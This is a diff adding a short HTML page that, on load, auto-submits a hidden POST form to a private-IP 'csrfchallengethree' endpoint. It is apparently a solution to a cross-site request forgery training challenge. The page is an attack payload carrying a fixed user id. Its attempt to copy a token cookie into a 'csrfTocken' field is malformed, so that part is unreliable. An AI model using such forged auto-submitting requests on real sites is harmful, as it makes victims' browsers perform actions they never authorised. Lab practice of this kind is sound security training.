@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script>
+
+  <form id="myForm" action="https://192.168.9.113/user/csrfchallengethree/plusplus" method="post">
+    <div>
+      <input name="userid" value="46e6cc2c6bd3435da76c4978037b2d9cea2e2185">
+      <input name="csrfTocken" value=Cookies.get('token');>
+      <input type="submit" value="Submit">
+    </div>
+  </form>
+  
+
+  <script>
+    document.getElementById("myForm").submit();
+  </script>
+
+</body>
+</html>
